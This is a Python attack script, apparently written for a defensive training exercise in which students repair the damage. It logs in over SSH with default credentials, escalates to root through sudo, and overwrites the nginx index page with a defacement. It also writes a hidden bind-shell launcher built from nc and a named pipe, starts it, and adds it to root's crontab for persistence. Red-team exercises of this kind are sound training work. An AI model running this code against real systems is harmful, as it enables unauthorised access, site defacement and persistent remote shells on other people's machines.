"""
Attack 1: SSH login → sudo root escalation → nginx deface + bind shell.

All default users can run `sudo su` with their own password, so after
authenticating we escalate to root via `sudo -S` before writing files.

Actions taken as root:
  1. Overwrite nginx index.html with defacement (removes SEARCH_TEXT so
     the checker HTTP check fails).
  2. Write a bind shell launcher script to BIND_SCRIPT_PATH.
  3. Start the bind shell immediately in the background.
  4. Add the launcher to root's crontab so it restarts every minute
     if killed.

Students fix this by:
  - Restoring index.html
  - Removing /usr/local/bin/.syscheck
  - Running `crontab -e` as root and deleting the entry
  - Killing the nc process: `pkill -f 'nc.*4444'`
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import base64
import paramiko
from config import TARGET_HOST, DEFAULT_CREDS, NGINX_ROOTS, BIND_PORT, BIND_SCRIPT_PATH

DEFACE_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Service Unavailable</title>
<style>
  body { background: #0a0a0a; color: #ff4444; font-family: monospace;
         display: flex; align-items: center; justify-content: center;
         height: 100vh; margin: 0; flex-direction: column; }
  h1   { font-size: 3rem; margin-bottom: 1rem; }
  p    { color: #888; }
</style>
</head>
<body>
  <h1>ACCESS DENIED</h1>
  <p>This system has been taken offline.</p>
</body>
</html>
"""

# Launcher script written to BIND_SCRIPT_PATH on the target.
# Checks if nc is already listening before starting a new one.
BIND_SHELL_SCRIPT = f"""\
#!/bin/bash
pgrep -f 'nc.*{BIND_PORT}' >/dev/null && exit 0
rm -f /tmp/.s
mkfifo /tmp/.s
nohup bash -c 'cat /tmp/.s | /bin/bash -i 2>&1 | nc -l -p {BIND_PORT} > /tmp/.s' &>/dev/null &
"""


def run(log):
    for username, password in DEFAULT_CREDS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(TARGET_HOST, username=username,
                           password=password, timeout=5)
        except Exception as e:
            log(f"  SSH [{username}] failed: {e}")
            continue

        log(f"  SSH [{username}] authenticated")

        # Verify sudo works with this password
        if not _check_sudo(client, password, log):
            log(f"  [{username}] sudo -S failed, trying next")
            client.close()
            continue

        log(f"  [{username}] sudo OK — running as root")
        success = _root_actions(client, password, log)
        client.close()
        return success

    log("  No credential with working sudo found.")
    return False


# ── Internal helpers ──────────────────────────────────────────────────

def _sudo(client, password, cmd):
    """Run cmd as root via sudo -S. cmd is base64-encoded to avoid quoting issues."""
    cmd_b64 = base64.b64encode(cmd.encode()).decode()
    wrapped  = f'echo "{password}" | sudo -S bash -c "$(echo {cmd_b64} | base64 -d)" 2>/dev/null'
    _, stdout, _ = client.exec_command(wrapped)
    stdout.channel.recv_exit_status()
    return stdout.read().decode().strip()


def _check_sudo(client, password, log):
    result = _sudo(client, password, "whoami")
    return "root" in result


def _root_actions(client, password, log):
    target_file = _find_index(client, log)
    if target_file is None:
        log("  Could not locate nginx index.html")
        return False

    # 1. Deface nginx — base64-encode HTML to skip all quoting issues
    html_b64 = base64.b64encode(DEFACE_HTML.encode()).decode()
    _sudo(client, password, f"echo {html_b64} | base64 -d > {target_file}")
    log(f"  Defaced {target_file}")

    # 2. Write bind shell launcher
    script_b64 = base64.b64encode(BIND_SHELL_SCRIPT.encode()).decode()
    _sudo(client, password,
          f"echo {script_b64} | base64 -d > {BIND_SCRIPT_PATH} && chmod +x {BIND_SCRIPT_PATH}")
    log(f"  Wrote bind shell launcher to {BIND_SCRIPT_PATH}")

    # 3. Start bind shell right now
    _sudo(client, password, BIND_SCRIPT_PATH)
    log(f"  Bind shell started on port {BIND_PORT}")

    # 4. Add launcher to root crontab (runs every minute, idempotent)
    cron_cmd = (
        f"(crontab -l 2>/dev/null | grep -v {BIND_SCRIPT_PATH}; "
        f"echo '* * * * * {BIND_SCRIPT_PATH}') | crontab -"
    )
    _sudo(client, password, cron_cmd)
    log("  Bind shell added to root crontab")

    return True


def _find_index(client, log):
    for root in NGINX_ROOTS:
        path = f"{root}/index.html"
        _, stdout, _ = client.exec_command(f"test -f {path} && echo YES || echo NO")
        if stdout.read().decode().strip() == "YES":
            log(f"  Found index at {path}")
            return path
    return None
